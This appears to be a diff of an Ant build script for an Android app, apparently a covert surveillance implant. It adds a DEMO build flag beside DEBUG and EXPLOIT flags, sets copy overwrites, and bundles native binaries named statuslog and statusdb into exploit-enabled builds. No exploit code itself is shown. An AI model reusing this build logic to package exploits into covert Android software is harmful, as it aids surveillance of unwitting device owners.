@@ -61,12 +61,13 @@
 			<filterset>
 				<filter token="DEBUG" value="true" />
 				<filter token="EXPLOIT" value="true" />
+				<filter token="DEMO" value="true" />
 			</filterset>
 		</copy>
-		<copy file="preprocess/config.debug.bin" toFile="res/raw/config.bin" />
-		<copy file="preprocess/resources.bin.patched" toFile="res/raw/resources.bin" />
-		<copy file="libs/armeabi/statuslog" toDir="assets/" />
-		<copy file="libs/armeabi/statusdb" toDir="assets/" />
+		<copy file="preprocess/config.debug.bin" toFile="res/raw/config.bin"  overwrite="true"/>
+		<copy file="preprocess/resources.bin.patched" toFile="res/raw/resources.bin"  overwrite="true"/>
+		<copy file="libs/armeabi/statuslog" toDir="assets/"  overwrite="true"/>
+		<copy file="libs/armeabi/statusdb" toDir="assets/"  overwrite="true"/>
 	</target>
 
 	<target name="set-release">
@@ -81,10 +82,11 @@
 			<filterset>
 				<filter token="DEBUG" value="false" />
 				<filter token="EXPLOIT" value="false" />
+				<filter token="DEMO" value="false" />
 			</filterset>
 		</copy>
-		<copy file="preprocess/config.release.bin" toFile="res/raw/config.bin" />
-		<copy file="preprocess/resources.bin" toFile="res/raw/resources.bin" />
+		<copy file="preprocess/config.release.bin" toFile="res/raw/config.bin"  overwrite="true"/>
+		<copy file="preprocess/resources.bin" toFile="res/raw/resources.bin"  overwrite="true"/>
 		<delete file="assets/statuslog" />
 		<delete file="assets/statusdb" />
 	</target>
@@ -101,10 +103,11 @@
 			<filterset>
 				<filter token="DEBUG" value="false" />
 				<filter token="EXPLOIT" value="false" />
+				<filter token="DEMO" value="true" />
 			</filterset>
 		</copy>
-		<copy file="preprocess/config.debug.bin" toFile="res/raw/config.bin" />
-		<copy file="preprocess/resources.bin.patched" toFile="res/raw/resources.bin" />
+		<copy file="preprocess/config.debug.bin" toFile="res/raw/config.bin"  overwrite="true"/>
+		<copy file="preprocess/resources.bin.patched" toFile="res/raw/resources.bin"  overwrite="true"/>
 		<delete file="assets/statuslog" />
 		<delete file="assets/statusdb" />
 	</target>
@@ -121,12 +124,13 @@
 			<filterset>
 				<filter token="DEBUG" value="false" />
 				<filter token="EXPLOIT" value="true" />
+				<filter token="DEMO" value="false" />
 			</filterset>
 		</copy>
-		<copy file="preprocess/config.release.bin" toFile="res/raw/config.bin" />
-		<copy file="preprocess/resources.bin" toFile="res/raw/resources.bin" />
-		<copy file="libs/armeabi/statuslog" toDir="assets/" />
-		<copy file="libs/armeabi/statusdb" toDir="assets/" />
+		<copy file="preprocess/config.release.bin" toFile="res/raw/config.bin"  overwrite="true"/>
+		<copy file="preprocess/resources.bin" toFile="res/raw/resources.bin"  overwrite="true"/>
+		<copy file="libs/armeabi/statuslog" toDir="assets/"  overwrite="true"/>
+		<copy file="libs/armeabi/statusdb" toDir="assets/"  overwrite="true"/>
 	</target>
 
 	<!--
@@ -205,8 +209,8 @@
 	</target>
 
 	<target name="htrelease" depends="clean, set-release, release, reverse">
-		<copy file="bin/android_service-unsigned.apk" toFile="bin/core-android"/>
-		<echo message="bin/core-android" />
+		<copy file="bin/android_service-unsigned.apk" toFile="bin/core.android"/>
+		<echo message="bin/core.android" />
 	</target>
 
 	<target name="htdemo" depends="clean, set-demo, release">
